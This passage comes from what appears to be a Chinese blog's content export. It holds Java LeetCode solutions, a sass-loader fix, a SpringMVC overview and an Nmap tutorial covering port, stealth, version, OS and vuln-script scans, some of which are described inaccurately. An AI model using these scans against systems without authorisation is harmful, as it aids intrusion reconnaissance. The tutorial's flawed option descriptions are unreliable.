class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<h4 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><p><font size="4" face="Open Sans">  * 时间复杂度：</font><font size="5" face="Open Sans"><b>O(N)</b></font><font size="4" face="Open Sans">。</font><br><font size="4" face="Open Sans">  * 空间复杂度：</font><font size="5" face="Open Sans"><b>O(1)</b></font><font size="4" face="Open Sans">。</font></p>
]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode-15-3Sum</title>
    <url>/article/c0eaf67c.html</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><font color="#856363" size="4" face="Open Sans">Given an array <span class="label label-primary">nums</span> of n integers, are there elements a, b, c in <span class="label label-primary">nums</span> such that a + b + c = 0? Find all unique triplets in the array which gives the sum of zero.</p>
<br>
<font size="4" face="Open Sans"><b>Notice</b></font> 
<br>
The solution set must not contain duplicate triplets.</font>


<a id="more"></a>


<p><font size="4" face="Open Sans"><b>Notice</b></font><br><br></p>
<figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">Given <span class="hljs-built_in">array</span> nums = [<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">-4</span>],<br>A solution <span class="hljs-keyword">set</span> <span class="hljs-keyword">is</span>:<br>[<br> [<span class="hljs-number">-1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>],<br> [<span class="hljs-number">-1</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">2</span>]<br>]<br></code></pre></div></td></tr></table></figure>

<h2 id="题目大意"><a href="#题目大意" class="headerlink" title="题目大意"></a>题目大意</h2><p><font size="4" face="Open Sans">给定一个数组，要求在这个数组中找到3个数之和为0的所有组合。</font></p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><font size="4" face="Open Sans">
    <font size="4" face="Open Sans"><b>排序 + 双指针</b></font> 
    <br>
    <br>
    大体的思路是先将给定的数组进行排序(排序的目的是实现在循环中内层的循环就不需要从比first值开始了，因为 [-1, 0, 1]、[0, -1, 1]和[0, 1, -1] 都是同一组)，接着正常分析的话，可以看出这是一个三层循环，时间复杂度是O(N³)，但是其中 [-1, 0, 1]、[0, -1, 1]和[0, 1, -1] 都是一种情况，所以后续我们需要通过哈希表来进行去重的操作。但其实是可以通过指针的方法将复杂度转化为O(N²)，因为题目要求我们实现三个数加起来为0，所以其实只要满足first=-(second+third)，<font size="4" face="Open Sans"><b> 即第二重循环和第三重循环实际上是并列的关系</b></font>。此时我们就可以使用双指针法，将second和third放在一层循环中。
</font>

<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> leetcode;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D15_3Sum</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> List&lt;List&lt;Integer&gt;&gt; threeSum(<span class="hljs-keyword">int</span>[] nums) &#123;<br>        <span class="hljs-keyword">int</span> n = nums.length;<br>        Arrays.sort(nums);<br>        List&lt;List&lt;Integer&gt;&gt; ans = <span class="hljs-keyword">new</span> ArrayList&lt;List&lt;Integer&gt;&gt;();<br>        <span class="hljs-comment">//枚举</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> first = <span class="hljs-number">0</span>; first &lt; n; ++first) &#123;<br>            <span class="hljs-comment">// 要求和上一次的枚举不同</span><br>            <span class="hljs-keyword">if</span> (first &gt; <span class="hljs-number">0</span> &amp;&amp; nums[first] == nums[first - <span class="hljs-number">1</span>]) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-comment">// third初始值始终是最右端</span><br>            <span class="hljs-keyword">int</span> third = n - <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">int</span> target = -nums[first];<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> second = first + <span class="hljs-number">1</span>; second &lt; n; second++) &#123;<br>                <span class="hljs-comment">// 需要和上一次枚举的数不相同</span><br>                <span class="hljs-keyword">if</span> (second &gt; first+<span class="hljs-number">1</span> &amp;&amp; nums[second] == nums[second - <span class="hljs-number">1</span>]) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-comment">//需要保证second在third的左侧</span><br>                <span class="hljs-keyword">while</span> (second &lt; third &amp;&amp; nums[second] + nums[third] &gt; target) &#123;<br>                    --third;<br>                &#125;<br>                <span class="hljs-comment">//当指针重合时，结束循环</span><br>                <span class="hljs-keyword">if</span> (second == third) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (nums[second] + nums[third] == target) &#123;<br>                    List&lt;Integer&gt; list = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>                    list.add(nums[first]);<br>                    list.add(nums[second]);<br>                    list.add(nums[third]);<br>                    ans.add(list);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<h3 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p><font size="4" face="Open Sans">  * 时间复杂度：</font><font size="5" face="Open Sans"><b>O(N²)</b></font><font size="4" face="Open Sans"> N代表的是nums数组的长度。</font><br><font size="4" face="Open Sans">  * 空间复杂度：</font><font size="5" face="Open Sans"><b>O(log(N))</b></font><font size="4" face="Open Sans"> 这里就是排序所需要的空间复杂度。</font></p>
<h2 id="收获与总结"><a href="#收获与总结" class="headerlink" title="收获与总结"></a>收获与总结</h2><font size="4" face="Open Sans">

<p>当我们需要枚举数组中的两个元素时，如果我们发现随着第一个元素的递增，第二个元素是递减的，那么就可以使用双指针的方法，将枚举的时间复杂度从 O(N²) 减少至 O(N)。为什么是 O(N) 呢？这是因为在枚举的过程每一步中，「左指针」会向右移动一个位置（也就是题目中的 bb），而「右指针」会向左移动若干个位置，这个与数组的元素有关，但我们知道它一共会移动的位置数为 O(N)，均摊下来，每次也向左移动一个位置，因此时间复杂度为 O(N)。</p>
</font>
]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Module build failed - 安装node-sass运行报错</title>
    <url>/article/c44bef1c.html</url>
    <content><![CDATA[<p><font color="#855E42" size="4" face="Open Sans"><br><br>    在运行Vue时，报了错，报了以下错误：</p>
<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs code">Module build failed: TypeError: this.getResolve is not a function at Object.loader ... \node_modules\sass-loader\dist ...<br></code></pre></div></td></tr></table></figure>

<p>   导致虽然运行起来了，但是页面不能正常显示，查询了资料之后，发现是因为当前sass的版本太高了，webpack编译时出现了异常，需要降低sass-loader的版本。<br>   这里我查了挺多资料的，但是都不太完整，执行之后，后续的操作还是有其他报错。最后这篇博客解决了我的问题：<br><a href="https://blog.csdn.net/ze1024/article/details/100516650" target="_blank" rel="noopener" class="LinkCard">Module build failed: TypeError: this.getResolve is not a function at Object.loader 安装node-sass运行报错</a></p>
<p>首先找到 <code>package.json</code> 这个文件，将其中的 <code>&quot;sass-loader&quot;: &quot;^11.0.0&quot;</code>(这里是我的版本) 改为 <code>&quot;sass-loader&quot;: &quot;^7.3.1&quot;</code></p>
<p>先卸载当前版本，再安装指定的版本</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#卸载当前版本</span><br>npm uninstall sass-loader<br><span class="hljs-comment">#安装(sass-loader之后的版本号，改为package.json中修改的版本)</span><br>npm install sass-loader@<span class="hljs-number">7.3</span><span class="hljs-number">.1</span> --save-dev<br></code></pre></div></td></tr></table></figure>

<p>接着运行就可运行成功了。<br></font></p>
]]></content>
      <categories>
        <category>程序猿</category>
      </categories>
      <tags>
        <tag>异常</tag>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode-11-ContainerWithMostWater</title>
    <url>/article/bca4f02.html</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><font color="#856363" size="4" face="Open Sans">Given n non-negative integers a1, a2, …, an , where each represents a point at coordinate (i, ai). nvertical lines are drawn such that the two endpoints of line i is at (i, ai) and (i, 0). Find two lines,<br>which together with x-axis forms a container, such that the container contains the most water.</font></p>
<p><font color="#856363" size="4" face="Open Sans"><b>Notice</b> that you may not slant the container.</font></p>
<a id="more"></a>

<hr>
<font size="4" face="Open Sans"><b>Example1</b></font>
<br>
<img src="https://aliyun-lc-upload.oss-cn-hangzhou.aliyuncs.com/aliyun-lc-upload/uploads/2018/07/25/question_11.jpg" srcset="/img/loading.gif">

<figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">Input: height = [<span class="hljs-number">1</span>,<span class="hljs-number">8</span>,<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">8</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>]<br>Output: <span class="hljs-number">49</span><br>Explanation: The above vertical lines are represented by <span class="hljs-built_in">array</span> [<span class="hljs-number">1</span>,<span class="hljs-number">8</span>,<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">8</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>]. In <span class="hljs-keyword">this</span> <span class="hljs-keyword">case</span>, the max area of water (blue section) the container can contain <span class="hljs-keyword">is</span> <span class="hljs-number">49.</span><br></code></pre></div></td></tr></table></figure>

<p><font size="4" face="Open Sans"><b>Example2</b></font></p>
<figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">Input: height = [<span class="hljs-number">1</span>,<span class="hljs-number">1</span>]<br>Output: <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure>

<p><font size="4" face="Open Sans"><b>Example3</b></font></p>
<figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">Input: height = [<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>]<br>Output: <span class="hljs-number">16</span><br></code></pre></div></td></tr></table></figure>

<p><font size="4" face="Open Sans"><b>Example4</b></font></p>
<figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">Input: height = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>]<br>Output: <span class="hljs-number">2</span><br></code></pre></div></td></tr></table></figure>

<h2 id="题目大意"><a href="#题目大意" class="headerlink" title="题目大意"></a>题目大意</h2><p><font size="4" face="Open Sans">给出一个非负整数数组a1,a2,a3,……an,没个整数标识一个竖立在坐标轴x位置的一堵高度为ai的墙，选择两堵墙，和x轴构成的容器可以容纳最多的谁。</font></p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="方法一：暴力枚举"><a href="#方法一：暴力枚举" class="headerlink" title="方法一：暴力枚举"></a>方法一：暴力枚举</h3><p><font size="4" face="Open Sans">暴力枚举每一种可能性，然后比较。</font></p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> leetcode;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D11_ContainerWithMostWater</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">maxArea</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] height)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> len = height.length;<br>        <span class="hljs-keyword">int</span> maxArea = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = i + <span class="hljs-number">1</span>; j &lt; len; j++) &#123;<br>                <span class="hljs-keyword">int</span> minNumber = Math.min(height[i],height[j]);<br>                <span class="hljs-keyword">if</span>(maxArea &lt; minNumber * (j - i)) &#123;<br>                    maxArea = minNumber * (j - i);<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> maxArea;<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<h4 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><p><font size="4" face="Open Sans">  * 时间复杂度：</font><font size="5" face="Open Sans"><b>O(N²)</b></font><font size="4" face="Open Sans">,两层嵌套循环。</font><br><font size="4" face="Open Sans">  * 空间复杂度：</font><font size="5" face="Open Sans"><b>O(1)</b></font><font size="4" face="Open Sans">。</font></p>
<h3 id="方法二：双指针"><a href="#方法二：双指针" class="headerlink" title="方法二：双指针"></a>方法二：双指针</h3><p><font size="4" face="Open Sans">这一题也是对撞指针的思路。首尾分别2个指针，每次移动以后都分别判断长宽的乘积是否最大。</font></p>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> leetcode;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D11_02ContainerWithMostWater</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">maxArea</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] height)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>, j = height.length - <span class="hljs-number">1</span>, maxArea = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (i &lt; j) &#123;<br>            maxArea = height[i] &gt; height[j] ?<br>                    Math.max(maxArea, (j - i) * height[j--]) :<br>                    Math.max(maxArea, (j - i) * height[i++]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> maxArea;<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<h4 id="复杂度分析-1"><a href="#复杂度分析-1" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><p><font size="4" face="Open Sans">  * 时间复杂度：</font><font size="5" face="Open Sans"><b>O(N)</b></font><font size="4" face="Open Sans">,双指针遍历一次底边宽度N。</font><br><font size="4" face="Open Sans">  * 空间复杂度：</font><font size="5" face="Open Sans"><b>O(1)</b></font><font size="4" face="Open Sans">指针使用常数额外空间。</font></p>
]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringMVC执行原理</title>
    <url>/article/7a197da5.html</url>
    <content><![CDATA[<p><font color="#856363" size="4" face="Open Sans"><b></p>
<p><img src="https://qiniuyun.fxhstudy.com/SpringMVC%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%861.png" srcset="/img/loading.gif"><br></p>
<p>图为SpringbootMVC的一个较为完整的流程图，实线表示SpringMVC框架提供的技术，不需要开发者实现，虚线表示需要开发者实现。</p>
<h3 id="简要分析执行流程"><a href="#简要分析执行流程" class="headerlink" title="简要分析执行流程"></a>简要分析执行流程</h3><ol type="1" start="1">
    <li><code>DispatcherServlet</code>表示前置控制器，是整个<code>SpringMVC</code>的控制中心。用户发出请求，<code>DispatcherServlet</code>接收请求并拦截请求。<br>
    我们假设请求的url为:http://localhost:8080/springMVC/hello<br><br>
    <b>如上url拆分成成三部分</b><br>
    http://localhost:8080服务器域名<br>
    <code>SpringMVC</code>部署在服务器上的web站点<br>
    <code>hello</code>表示控制器<br>
    通过分析，如上url表示为：请求位于服务器localhost:8080上的<code>SpringMVC</code>站点的<code>hello</code>控制器。</li>
    <li><code>HandlerMapping</code>为处理器映射。<code>DispatcherServlet</code>调用<br><code>HandlerMapping</code>,<code>HandlerMapping</code>根据请求url查找<code>Handler</code>。</li>
    <li><code>HandlerExecution</code>表示具体的<code>Handler</code>,其主要作用是根据url查找控制器，如上url被查找控制器为：<code>hello</code>。</li>
    <li><code>HandlerExecution</code>将解析后的信息传递给<code>DispatcherServlet</code>,如解析控制器映射等。</li>
    <li><code>HandlerAdapter</code>表示处理器适配器，其按照特定的规则去执行<code>Handler</code>。</li>
    <li><code>Handler</code>让具体的<code>Controller</code>执行。</li>
    <li><code>Controller</code>将具体的执行信息返回给<code>HandlerAdapter</code>,如<code>ModelAndView</code>。</li>
    <li><code>HandlerAdapter</code>将视图逻辑名或模型传递给<code>DispatcherServlet</code>。</li>
    <li><code>DispatcherServlet</code>调用视图解析器(ViewResolver)来解析<code>HandlerAdapter</code>传递的逻辑视图名。</li>
    <li>视图解析器将解析的逻辑视图名传给<code>DispatcherServlet</code>。</li>
    <li><code>DispatcherServlet</code>根据视图解析器解析的视图结果，调用具体的视图。</li>
    <li>最终视图呈现给用户。</li>
</ol>

</b>
</font>



]]></content>
      <categories>
        <category>程序猿</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>NMAP-漏洞扫描之王</title>
    <url>/article/e11385dd.html</url>
    <content><![CDATA[<p>不论是对于黑客还是白帽子来说，Nmap都是进入这个行业最先接触到的一个伟大的工具，被从事这个行业的人们称为端口扫描之王，<br>是的，Nmap可以说是一件非常好用，简便的工具，这篇文章我就介绍一下nmap的一些指令的意思，至于具体的使用方法大家可以去看一下<br>这篇文章，写的很详细👉<a href="https://www.cnblogs.com/st-leslie/p/5115280.html" target="_blank" rel="nofollow">端口扫描之王——nmap入门精讲</a></p>
<a id="more"></a>

<h1 id="什么是Nmap"><a href="#什么是Nmap" class="headerlink" title="什么是Nmap?"></a>什么是Nmap?</h1><p>Nmap（网络映射器）是一款用于网络发现和安全审计的网络安全工具，它是自由软件。软件名字Nmap是Network Mapper的简称。通常情况下，Nmap用于：</p>
<blockquote><li>列举网络主机清单</li>
    <li>管理服务升级调度</li>
    <li>监控主机</li>
    <li>服务运行状况</li>
</blockquote>

<p>Nmap可以检测目标主机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息。 它是网络管理员必用的软件之一，用以评估网络系统安全。</p>
<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><p>Nmap [空格][选择][多选项][协议][空格][目标]</p>
<h2 id="主机发现-扫描模式"><a href="#主机发现-扫描模式" class="headerlink" title="主机发现(扫描模式)"></a>主机发现(扫描模式)</h2><h3 id="常用扫描方式"><a href="#常用扫描方式" class="headerlink" title="常用扫描方式"></a>常用扫描方式</h3><p>常用选项:</p>
<blockquote>
    -IP 指定IP扫描<br>
    -p  指定一个好或者一个范围<br>
    -F  快速扫描，不会随机扫描，顺序扫描端口，默认随机顺序扫描<br>
    -top-ports<br>
        参考用法：[nmap --top-ports 100 目标]  扫描100个开放率最高的端口<br>
    -A 全面扫描<br>
</blockquote><br>
TPC SYN扫描:
<blockquote>
    -sS  半开放扫描，扫描速度越快，隐蔽性越好
</blockquote><br>
TCP连接扫描:
<blockquote>
    -sT  扫描速度越快，准确性高，但是容易被防火墙发现
</blockquote><br>
UDP扫描:
<blockquote>
    -sU  udp端口扫描，扫描速度较慢
</blockquote><br>
隐蔽扫描:
<blockquote>
    -sV,-sF,-sX,能躲过一些无状态防火墙和报文过滤路由器，比SYN还要隐蔽
</blockquote>

<h3 id="域名扫描"><a href="#域名扫描" class="headerlink" title="域名扫描"></a>域名扫描</h3><p>列表扫描:</p>
<blockquote>
    -sL  列出指定网络上的每台主机，默认是用域名解析获得他们的名字
</blockquote><br>
禁止反向域名解析:
<blockquote>
    -n  不对目标地址作为反向域名解析，能够提高扫描效率
</blockquote><br>
<a href="https://baike.baidu.com/item/%E5%8F%8D%E5%90%91%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90" target="_blank" rel="noopener">反向域名解析:</a>
<blockquote>
    -R  对目标地址作为反向域名解析，查询目标地址是否绑定域名
</blockquote>

<h2 id="端口扫描状态"><a href="#端口扫描状态" class="headerlink" title="端口扫描状态"></a>端口扫描状态</h2><p><font size="3" color="red">Open：端口开放</font><br><font size="3" color="red">Closed：端口关闭</font><br><font size="3" color="red">Filtered：防火墙被过滤</font><br><font size="3" color="red">Unfiltered：未被过滤，但不能确定是否开放</font><br><font size="3" color="red">OpenFiltered：不能确定开放还是过滤</font><br><font size="3" color="red">CloseFiltered：不确定是关闭还是被过滤的</font></p>
<h2 id="指纹识别-服务以及系统探测"><a href="#指纹识别-服务以及系统探测" class="headerlink" title="指纹识别(服务以及系统探测)"></a>指纹识别(服务以及系统探测)</h2><p>版本扫描</p>
<blockquote>
    -sV    通过端口对应相应的服务器，识别出相应的版本
</blockquote>
全端口版本扫描
<br>
<blockquote>
    -allports  启用全端口版本扫描，会跳过9100TCP段，只有使用--allports才能扫描所有端口
</blockquote>
扫描强度
<br>
<blockquote>
    --version-intensity<br>
    扫描强度为0~9，默认为7，最低为0，最高为9；<br>
    扫描轻度越高，之间越长，服务越有可能被正确识别<br>
</blockquote>
<br>
操作系统探测
<blockquote>
    -O  探测系统版本：linux和Windows有明显区别
</blockquote>

<h2 id="Nmap脚本使用"><a href="#Nmap脚本使用" class="headerlink" title="Nmap脚本使用"></a>Nmap脚本使用</h2><p>这一块真的我感觉用的时候查一下就可以了，大都差不多</p>
<h2 id="保存输出"><a href="#保存输出" class="headerlink" title="保存输出"></a>保存输出</h2><p>标准输出</p>
<blockquote>
    -oN  [nmap -oN test.txt 目标] 将标准输出保存到指定文件
</blockquote>
<br>
XML保存
<blockquote>
    -oX  [nmap -oX test.xml 目标]  保存一个xsl样式表，使用web浏览器加载文件
</blockquote>


<h1 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h1><p><font size="4" color="black">无任何附加参数</font><br>nmap目标–&gt;超级用户，无参扫描等价于sS参数扫描<br>–&gt;普通用户，无参数扫描等价于sT参数扫描(TCP, 完整连接)</p>
<p><font size="4" color="black">指定端口号：</font><br>nmap -p端口号 IP地址<br>这里p参数表示端口，标准写法后面跟的端口号之间没有空格</p>
<p><font size="4" color="black">系统探测：</font><br>namp -O/A IP地址</p>
<p><font size="4" color="black">只进行主机发现：</font><br>nmap -sn IP地址<br>使用ping扫描来侦测存或的主机，而不进行端口扫描</p>
<p><font size="4" color="red">跳过主机发现</font><br>nmap -Pn IP地址<br>侦测开放的端口来判断开放的服务，并试图检测它的版本</p>
<p><font size="4" color="red">漏洞扫描</font><br>nmap –script=vuln 目标<br>使用vuln脚本扫描漏洞</p>
<br>

<br>
<br>
<br>
<br>
<br>
<br>]]></content>
      <categories>
        <category>kali学习</category>
        <category>kali工具</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>The End of The Fucking 2020</title>
    <url>/article/4a6b1db1.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
  <script id="hbeData" type="hbeData" data-hmacdigest="c24685e0c051f91b735a0828c0e017d650bebf16e2fae2c50ec697939714ddf3">d8cd019511c7f3543a104e8f05f74c58cebf7f20e37ce0071ceeb73c03a3799a136157916055c2fe489111828ee8bd7f6562b1be6761d135b550911f06812e0c7ea916aa7e23699c0a4fccd277fe083f995820f6bb64eb69b826ea80d0ecfdb10d59477916173eb2df9289285a738fc449c63f36fcfdf927ee821fd4d186ebd93886ad26d35179105bfd38996f73910005c89d880d9059ff836c4c87ca9cf6f9f4e9a5aee4596d7e0515e158367f5ba342b7e4a8913d7691eea0d79a8709fcd249dce89cf8855b2c40ac1702810f959ab4cb0dc41ab1c3bb6f035cec320cf128b8e1a4c14c224983b9475d9ccba8d79c968bcfcc35a1ccf1b59be30caaa3977680b2bafb132942f1ea2d0838719e732ff85eeff6650a54b91fb8fe7800995eb1581f71b113baf0b951bca0915421e5d446676ad2114052598d5240b99273d00d8577aea2290af8e649ef5af3136a8ce19aeda5704a85d148a8b1c4cdbd12f8480b71fdd82d4187307abb4ff8fd8510bc9bcdfedef7a55bc801cadb85bd8699c214d4dde73c73792bcf8d1424041f674d6204bde14e1f25ccf0acb7f8191f18fc29e2b750c0105c8e67a4b0963b062fb3cbb3f256927c82414b4cbd0a7f33be49a60dffae749b0969b1989898bc2a2f3346e5c4e314d19fbd7d07e7ebaa98ab178bfeea4f6f097d48a9ba36ca0bf723599e406381de603288055175f6b0205e187b698369be7bd90b9bb6227f1fa2001bf95494de186a1245b98d6deb3bee7b57f5fa6acfa23ea199dcadc68cde28ccb24663ab4882f5aedc8691598ade6055cdc34d9a4660c8313d1d2943d9bead2b4b36dbc7c51f104d64849cac6d8792065d004e71fb0bfa2c4f22cc20ad3fdb2437c3f4965b1f76cbcdb5758038d0555ceb5a92484c03fd4e3ca362fb50ab647a77f3981a0a251a0efd792f1fa7061c5f020bc527333a535da002c761232bf7050839d205cce6029da19bcedf3a34e93d5e5c654c481af5273a7de9f2604e8e23320d1ec19de2980b7008cc8be09bb12817bf28b61b7cf41ee1db2cf397a56d02d31baf2ecd6cae1a751fac62dbb431507ff6db3c7feab2fa735e7690c5606f646d774a46a01d3a244e079a514a49927d321bbed614a137f09c20b7f88244288a110ec0364d4324893798cf151ea2353bf20baa83d333c6de247323b5ff7e3ab61e53c44834beafb17f856a73c7f0ed7c25d3ff347374f95b038c3e35cb5e3f499edf2f81a570a7bec5c566a6bd687a90a9a0c90c7b264f1cb886bc9f5dd104dba40ec2261092e5d158b13430ebfa12a07270cad8